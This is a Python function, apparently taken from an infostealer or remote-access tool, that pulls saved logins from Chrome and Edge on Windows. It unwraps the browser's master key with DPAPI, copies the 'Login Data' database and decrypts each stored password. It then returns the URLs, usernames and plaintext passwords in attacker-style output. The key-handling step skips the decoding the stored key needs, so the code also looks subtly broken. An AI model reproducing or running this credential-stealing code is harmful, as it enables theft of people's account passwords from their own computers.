def browser_credentials():
    import os
    import json
    import shutil
    import sqlite3
    try:
        from Crypto.Cipher import AES
        import win32crypt
    except ImportError:
        return '[-] Missing dependencies (pycryptodome, pywin32)'

    result = ''
    browsers = {
        'Chrome': os.path.join(
            os.environ.get('LOCALAPPDATA', ''),
            r'Google\Chrome\User Data'
        ),
        'Edge': os.path.join(
            os.environ.get('LOCALAPPDATA', ''),
            r'Microsoft\Edge\User Data'
        ),
    }

    for name, path in browsers.items():
        if not os.path.exists(path):
            continue
        try:
            local_state = os.path.join(path, 'Local State')
            with open(local_state, 'r', encoding='utf-8') as f:
                state = json.load(f)
            encrypted_key = state['os_crypt']['encrypted_key']
            decryption_key = win32crypt.CryptUnprotectData(
                encrypted_key, None, None, None, 0
            )[1]
        except Exception:
            continue

        login_db = os.path.join(path, 'Default', 'Login Data')
        if not os.path.exists(login_db):
            continue

        temp_db = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'login_temp.db')
        try:
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(
                'SELECT origin_url, username_value, password_value FROM logins'
            )
            for url, username, encrypted_password in cursor.fetchall():
                if not username or not encrypted_password:
                    continue
                try:
                    iv = encrypted_password[3:15]
                    payload = encrypted_password[15:]
                    cipher = AES.new(decryption_key, AES.MODE_GCM, iv)
                    password = cipher.decrypt(payload)[:-16].decode()
                    result += f'[{name}] {url}\n  -> {username}:{password}\n'
                except Exception:
                    continue
            conn.close()
        except Exception:
            pass
        finally:
            try:
                os.remove(temp_db)
            except Exception:
                pass

    return result.strip() or '[-] No browser credentials found'
